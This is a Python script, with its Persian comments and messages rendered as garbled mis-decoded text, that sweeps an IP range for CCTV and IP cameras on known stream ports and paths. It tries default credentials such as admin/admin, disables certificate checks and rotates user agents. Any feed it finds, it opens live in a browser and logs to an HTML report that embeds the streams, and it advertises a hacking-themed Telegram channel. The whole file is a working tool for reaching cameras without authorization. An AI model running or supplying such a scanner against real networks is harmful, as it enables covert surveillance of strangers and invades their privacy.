import requests
import socket
import threading
import time
import webbrowser
from urllib.parse import urlparse
from colorama import Fore, Style, init
import os
import cv2
import numpy as np
from concurrent.futures import ThreadPoolExecutor, as_completed

# Initialize colorama
init(autoreset=True)

# ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ø­Ø±ÙÙ‡â€ŒØ§ÛŒ
CONFIG = {
    "TELEGRAM_CHANNEL": "https://t.me/kalilinux_ghost",
    "TIMEOUT": 3,
    "MAX_THREADS": 100,
    "AUTO_OPEN": True,
    "PREVIEW": True,
    "AUTH": {"admin": "admin", "root": "12345"},  # Ù„ÛŒØ³Øª Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒ
    "PORTS": {
        80: {"type": "mjpeg", "paths": ["/video/mjpg", "/cameras/mjpg"]},
        81: {"type": "http", "paths": ["/live"]},
        554: {"type": "rtsp", "paths": ["/live.sdp", "/stream"]},
        8000: {"type": "api", "paths": ["/ISAPI/Streaming"]},
        8080: {"type": "jpg", "paths": ["/snapshot.jpg"]},
        37777: {"type": "dahua", "paths": ["/cgi-bin/snapshot"]}
    },
    "USER_AGENTS": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
        "Mozilla/5.0 (Linux; Android 10; SM-G975F)"
    ]
}

class UltimateCameraScanner:
    def __init__(self):
        self.live_feeds = []
        self.session = requests.Session()
        self.session.verify = False
        self.lock = threading.Lock()
        self.scan_stats = {
            "scanned": 0,
            "found": 0,
            "start_time": time.time()
        }

    def get_random_agent(self):
        import random
        return {"User-Agent": random.choice(CONFIG["USER_AGENTS"])}

    def try_auth(self, url):
        """Ø§Ù…ØªØ­Ø§Ù† Ú©Ø±Ø¯Ù† Ø§Ø¹ØªØ¨Ø§Ø±Ø³Ù†Ø¬ÛŒâ€ŒÙ‡Ø§ÛŒ Ù…Ø®ØªÙ„Ù"""
        for username, password in CONFIG["AUTH"].items():
            try:
                auth_url = f"{url}?username={username}&password={password}"
                response = self.session.get(auth_url, timeout=CONFIG["TIMEOUT"])
                if response.status_code == 200:
                    return auth_url
            except:
                continue
        return url

    def check_stream(self, ip, port, path):
        """Ø¨Ø±Ø±Ø³ÛŒ Ú©ÛŒÙÛŒØª Ø§Ø³ØªØ±ÛŒÙ… Ùˆ Ù†Ù…Ø§ÛŒØ´ Ù¾ÛŒØ´â€ŒÙ†Ù…Ø§ÛŒØ´"""
        url = f"http://{ip}:{port}{path}" if port != 80 else f"http://{ip}{path}"
        auth_url = self.try_auth(url)
        
        try:
            if CONFIG["PREVIEW"] and port in [80, 81, 8080]:
                cap = cv2.VideoCapture(auth_url)
                ret, frame = cap.read()
                if ret:
                    cv2.imshow(f'Camera {ip}', frame)
                    cv2.waitKey(1000)
                    cv2.destroyAllWindows()
                    cap.release()
                    return auth_url
            else:
                response = self.session.head(auth_url, timeout=CONFIG["TIMEOUT"])
                if response.status_code == 200:
                    return auth_url
        except:
            return None

    def scan_port(self, ip, port, port_info):
        """Ø§Ø³Ú©Ù† ÛŒÚ© Ù¾ÙˆØ±Øª Ø®Ø§Øµ"""
        results = []
        for path in port_info["paths"]:
            url = self.check_stream(ip, port, path)
            if url:
                with self.lock:
                    self.scan_stats["found"] += 1
                    self.live_feeds.append({
                        "ip": ip,
                        "port": port,
                        "type": port_info["type"],
                        "url": url,
                        "time": time.strftime("%H:%M:%S")
                    })
                    print(f"{Fore.GREEN}ğŸ¥ Ø¯ÙˆØ±Ø¨ÛŒÙ† ÙØ¹Ø§Ù„: {Fore.CYAN}{ip}:{port} {Fore.YELLOW}({port_info['type']})")
                    print(f"{Fore.LIGHTBLUE_EX}ğŸ”— Ù„ÛŒÙ†Ú©: {Style.BRIGHT}{url}")
                    if CONFIG["AUTO_OPEN"]:
                        webbrowser.open(url)
                results.append(url)
        return results

    def scan_ip(self, ip):
        """Ø§Ø³Ú©Ù† Ú©Ø§Ù…Ù„ ÛŒÚ© IP"""
        with ThreadPoolExecutor(max_workers=CONFIG["MAX_THREADS"]) as executor:
            futures = []
            for port, port_info in CONFIG["PORTS"].items():
                futures.append(executor.submit(self.scan_port, ip, port, port_info))
            
            for future in as_completed(futures):
                self.scan_stats["scanned"] += 1

    def scan_range(self, ip_range, start, end):
        """Ø§Ø³Ú©Ù† Ù…Ø­Ø¯ÙˆØ¯Ù‡ IP"""
        print(f"\n{Fore.MAGENTA}ğŸš€ Ø´Ø±ÙˆØ¹ Ø§Ø³Ú©Ù† Ø­Ø±ÙÙ‡â€ŒØ§ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ†â€ŒÙ‡Ø§ÛŒ Ù…Ø¯Ø§Ø±Ø¨Ø³ØªÙ‡")
        print(f"{Fore.CYAN}ğŸ“¢ Ú©Ø§Ù†Ø§Ù„ ØªÙ„Ú¯Ø±Ø§Ù…: {CONFIG['TELEGRAM_CHANNEL']}")
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(self.scan_ip, [f"{ip_range}{i}" for i in range(start, end+1)])

    def save_results(self):
        """Ø°Ø®ÛŒØ±Ù‡ Ù†ØªØ§ÛŒØ¬ Ø¨Ø§ ÙØ±Ù…Øª Ù¾ÛŒØ´Ø±ÙØªÙ‡"""
        if not os.path.exists("scans"):
            os.makedirs("scans")
            
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"scans/camera_scan_{timestamp}.html"
        
        with open(filename, "w", encoding="utf-8") as f:
            f.write(f"""
<!DOCTYPE html>
<html>
<head>
    <title>Ù†ØªØ§ÛŒØ¬ Ø§Ø³Ú©Ù† Ø¯ÙˆØ±Ø¨ÛŒÙ† {timestamp}</title>
    <style>
        body {{ font-family: Arial; direction: rtl; }}
        .camera {{ border: 1px solid #ddd; padding: 10px; margin: 10px; }}
        .live {{ color: green; font-weight: bold; }}
    </style>
</head>
<body>
    <h1>Ù†ØªØ§ÛŒØ¬ Ø§Ø³Ú©Ù† Ø¯ÙˆØ±Ø¨ÛŒÙ†â€ŒÙ‡Ø§ÛŒ Ù…Ø¯Ø§Ø±Ø¨Ø³ØªÙ‡</h1>
    <p>ØªØ§Ø±ÛŒØ®: {time.strftime("%Y/%m/%d %H:%M:%S")}</p>
    <p>Ú©Ø§Ù†Ø§Ù„ ØªÙ„Ú¯Ø±Ø§Ù…: <a href="{CONFIG['TELEGRAM_CHANNEL']}">{CONFIG['TELEGRAM_CHANNEL']}</a></p>
    <hr>
            """)
            
            for cam in self.live_feeds:
                f.write(f"""
    <div class="camera">
        <h3>Ø¯ÙˆØ±Ø¨ÛŒÙ† {cam['ip']}:{cam['port']}</h3>
        <p>Ù†ÙˆØ¹: {cam['type']}</p>
        <p>Ø²Ù…Ø§Ù† Ø´Ù†Ø§Ø³Ø§ÛŒÛŒ: {cam['time']}</p>
        <p class="live">Ù„ÛŒÙ†Ú© Ø²Ù†Ø¯Ù‡: <a href="{cam['url']}" target="_blank">{cam['url']}</a></p>
        <iframe src="{cam['url']}" width="640" height="480" frameborder="0"></iframe>
    </div>
                """)
            
            f.write("</body></html>")
        
        print(f"\n{Fore.GREEN}ğŸ’¾ Ú¯Ø²Ø§Ø±Ø´ Ú©Ø§Ù…Ù„ Ø¯Ø± {filename} Ø°Ø®ÛŒØ±Ù‡ Ø´Ø¯")

    def show_stats(self):
        """Ù†Ù…Ø§ÛŒØ´ Ø¢Ù…Ø§Ø± Ù†Ù‡Ø§ÛŒÛŒ"""
        elapsed = time.time() - self.scan_stats["start_time"]
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.LIGHTYELLOW_EX}ğŸ” Ø§Ø³Ú©Ù† Ú©Ø§Ù…Ù„ Ø´Ø¯!")
        print(f"â± Ø²Ù…Ø§Ù† Ø§Ø¬Ø±Ø§: {elapsed:.2f} Ø«Ø§Ù†ÛŒÙ‡")
        print(f"ğŸ”Œ Ù¾ÙˆØ±Øªâ€ŒÙ‡Ø§ÛŒ Ø§Ø³Ú©Ù† Ø´Ø¯Ù‡: {self.scan_stats['scanned']}")
        print(f"ğŸ“¡ Ø¯ÙˆØ±Ø¨ÛŒÙ†â€ŒÙ‡Ø§ÛŒ ÙØ¹Ø§Ù„ ÛŒØ§ÙØª Ø´Ø¯Ù‡: {self.scan_stats['found']}")
        print(f"{Fore.MAGENTA}ğŸ“¢ Ú©Ø§Ù†Ø§Ù„ ØªÙ„Ú¯Ø±Ø§Ù…: {CONFIG['TELEGRAM_CHANNEL']}")
        print(f"{Fore.CYAN}{'='*60}")

if __name__ == "__main__":
    print(f"\n{Fore.BLUE}{'='*70}")
    print(f"{Fore.LIGHTYELLOW_EX}ğŸ”¥ğŸ”¥ Ø§Ø³Ú©Ù†Ø± ÙÙˆÙ‚ Ø­Ø±ÙÙ‡â€ŒØ§ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ù…Ø¯Ø§Ø±Ø¨Ø³ØªÙ‡ v5.0 ğŸ”¥ğŸ”¥")
    print(f"{Fore.BLUE}{'='*70}")
    
    ip_range = input("\nğŸŒ Ù…Ø­Ø¯ÙˆØ¯Ù‡ IP Ø±Ø§ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ (Ù…Ø«Ø§Ù„: 192.168.1.): ").strip()
    start_ip = int(input("Ø´Ù…Ø§Ø±Ù‡ IP Ø´Ø±ÙˆØ¹ (Ù¾ÛŒØ´â€ŒÙØ±Ø¶=1): ") or 1)
    end_ip = int(input("Ø´Ù…Ø§Ø±Ù‡ IP Ù¾Ø§ÛŒØ§Ù† (Ù¾ÛŒØ´â€ŒÙØ±Ø¶=255): ") or 255)
    
    scanner = UltimateCameraScanner()
    scanner.scan_range(ip_range, start_ip, end_ip)
    scanner.save_results()
    scanner.show_stats()
